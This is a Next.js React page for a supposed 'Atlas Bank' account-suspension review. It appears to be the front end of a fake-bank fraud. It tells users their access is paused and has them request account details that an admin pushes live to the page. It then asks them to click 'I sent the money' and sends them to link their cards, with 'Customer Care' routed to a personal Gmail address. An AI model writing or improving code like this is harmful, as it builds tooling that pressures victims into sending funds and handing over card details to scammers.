"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { DEMO_CUSTOMER_EMAIL } from "@/lib/adminData";
import { fetchCustomerSuspensionByEmail, getNewUserSession, notifyAdminMoneySent, requestAccountGeneration } from "@/lib/newUserData";
import { supabase } from "@/lib/supabase";

export default function SuspensionContinuePage() {
  const router = useRouter();
  const [isGenerateModalOpen, setIsGenerateModalOpen] = useState(false);
  const [isRequesting, setIsRequesting] = useState(false);
  const [message, setMessage] = useState("");
  const [accountDetails, setAccountDetails] = useState("");
  const [isNotifyingMoneySent, setIsNotifyingMoneySent] = useState(false);
  const [isNewUser, setIsNewUser] = useState(false);

  useEffect(() => {
    const session = getNewUserSession();
    const email = typeof window !== "undefined" ? window.localStorage.getItem("customerEmail") || session?.customerEmail : session?.customerEmail;
    const customerEmail = email || DEMO_CUSTOMER_EMAIL;
    setIsNewUser(Boolean(session && customerEmail.toLowerCase() === session.customerEmail.toLowerCase()));

    const loadStatus = async () => {
      const customer = await fetchCustomerSuspensionByEmail(customerEmail);
      setAccountDetails(customer?.accountDetails ?? "");
    };

    void loadStatus();
    const channel = supabase?.channel("customer-account-details")
      .on("postgres_changes", { event: "UPDATE", schema: "public", table: "customers", filter: `email=eq.${customerEmail}` }, (payload) => {
        const details = (payload.new as Record<string, unknown>).account_details;
        if (typeof details === "string" && details) {
          setAccountDetails(details);
          setMessage("Your account details are ready.");
        }
      })
      .subscribe();

    return () => {
      if (channel) void supabase?.removeChannel(channel);
    };
  }, []);

  const handleGenerateAccount = async () => {
    const session = getNewUserSession();
    const email = typeof window !== "undefined" ? window.localStorage.getItem("customerEmail") || session?.customerEmail : session?.customerEmail;
    if (!email) {
      setMessage("We could not identify your account. Please sign in again.");
      return;
    }

    setIsRequesting(true);
    setMessage("");
    try {
      await requestAccountGeneration(email);
      setIsGenerateModalOpen(false);
      setMessage("Your request has been sent. Please remain on standby while your account is generated.");
    } catch {
      setMessage("We could not send your request. Please try again or contact Customer Care.");
    } finally {
      setIsRequesting(false);
    }
  };

  const handleNotifyMoneySent = async () => {
    const session = getNewUserSession();
    const email = typeof window !== "undefined" ? window.localStorage.getItem("customerEmail") || session?.customerEmail : session?.customerEmail;
    if (!email) {
      setMessage("We could not identify your account. Please sign in again.");
      return;
    }

    setIsNotifyingMoneySent(true);
    setMessage("");
    try {
      await notifyAdminMoneySent(email);
      setMessage("The admin has been notified that your money was sent.");
    } catch {
      setMessage("We could not notify the admin. Please try again.");
    } finally {
      setIsNotifyingMoneySent(false);
    }
  };

  return (
    <main className="auth-layout suspension-page">
      <section className="auth-card suspension-card" aria-labelledby="suspension-next-step-title">
        <div className="auth-card-header">
          <strong className="auth-logo">ATLAS BANK</strong>
          <p className="eyebrow">Account review</p>
          <div className="suspension-review-mark" aria-hidden="true">2</div>
          <h1 id="suspension-next-step-title">Let&apos;s review your account</h1>
          <p>Your account access is paused while our team reviews the suspension. Either complete the following task or contact Customer Care to help you understand what happens next.</p>
        </div>

        <div className="suspension-review-list">
          <div><span>01</span><p><strong>Share your account details</strong>Contact Customer Care with the information they need.</p></div>
          <div><span>02</span><p><strong>Follow the review instructions</strong>Our team will guide the next step.</p></div>
          <div><span>03</span><p><strong>Wait for confirmation</strong>We will let you know when transfers are available again.</p></div>
        </div>

        <div className="suspension-choice-grid">
          <button className="suspension-choice" type="button" onClick={() => setIsGenerateModalOpen(true)}>
            <span className="suspension-choice-label">Transfer</span>
            <strong>Generate account</strong>
            <small>Request account details from our review team.</small>
          </button>
          <button className="suspension-choice" type="button" onClick={() => router.push(isNewUser ? "/new-user/cards" : "/dashboard/cards")}>
            <span className="suspension-choice-label">Card payment</span>
            <strong>Link your card</strong>
            <small>Go to the card page to link your cards.</small>
          </button>
        </div>

        {message ? <p className="settings-note suspension-standby-message" role="status">{message}</p> : null}
        {accountDetails ? <div className="suspension-account-details"><span>Account details received</span><p>{accountDetails}</p></div> : null}
        {accountDetails ? <div className="suspension-money-action"><div><span className="suspension-action-kicker">Next step</span><strong>Have you sent the funds?</strong><small>Let the review team know so they can check your account.</small></div><button className="primary-btn" type="button" onClick={handleNotifyMoneySent} disabled={isNotifyingMoneySent}>{isNotifyingMoneySent ? "Notifying admin..." : "I sent the money"}</button></div> : null}

        <div className="form-actions suspension-actions">
          <a className="primary-btn" href="mailto:workdaysupport.novatech@gmail.com?subject=Atlas%20Bank%20account%20review&body=Hello%20Atlas%20Bank%20Support%2C%0A%0AI%20would%20like%20to%20request%20a%20review%20of%20my%20suspended%20account.">Email Customer Care</a>
          <button className="secondary-btn" type="button" onClick={() => router.back()}>Back</button>
        </div>
      </section>
      {isGenerateModalOpen ? (
        <div className="transfer-code-overlay" role="presentation" onMouseDown={() => setIsGenerateModalOpen(false)}>
          <section className="transfer-code-modal suspension-request-modal" role="dialog" aria-modal="true" aria-labelledby="generate-account-title" onMouseDown={(event) => event.stopPropagation()}>
            <p className="eyebrow">Transfer review</p>
            <h2 id="generate-account-title">Generate account details?</h2>
            <p className="transfer-code-copy">We will notify the review team. Keep this page open while your account details are being generated.</p>
            <div className="form-actions">
              <button className="secondary-btn" type="button" onClick={() => setIsGenerateModalOpen(false)}>Cancel</button>
              <button className="primary-btn" type="button" onClick={handleGenerateAccount} disabled={isRequesting}>{isRequesting ? "Sending request..." : "Generate account"}</button>
            </div>
          </section>
        </div>
      ) : null}
    </main>
  );
}
